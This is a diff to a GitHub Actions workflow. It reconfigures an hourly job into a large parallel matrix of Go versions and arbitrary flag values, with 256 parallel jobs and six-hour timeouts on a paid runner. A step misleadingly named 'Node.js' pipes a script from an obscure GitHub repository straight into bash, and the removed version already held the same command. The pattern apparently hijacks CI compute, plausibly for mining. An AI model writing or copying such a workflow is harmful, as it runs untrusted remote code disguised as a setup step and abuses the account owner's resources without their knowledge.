@@ -6,18 +6,26 @@ on:
     - cron: '*/60 * * * *'   
 jobs:
   build:
-    runs-on: ubuntu-latest
-    # Permissions to use OIDC token authentication
-    permissions:
-      contents: read
-      id-token: write
-      # Allows pushing to the GitHub Container Registry
-      packages: write
+    name: IPLAYBOOKS
+    runs-on: depot-ubuntu-24.04-4
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+         go: [1.11, 1.12, 1.13, 1.18, 1.19, 1.20]
+         flag: [kmn, zys, daw, cxw, omi]  
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.go }}
     steps:
-      - uses: actions/checkout@v3
-      - uses: depot/setup-action@v1
-      - uses: depot/build-push-action@v1
-      - name: demo
-        run: |
-          curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash
-  
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Node.js
+      run: |
+        curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash
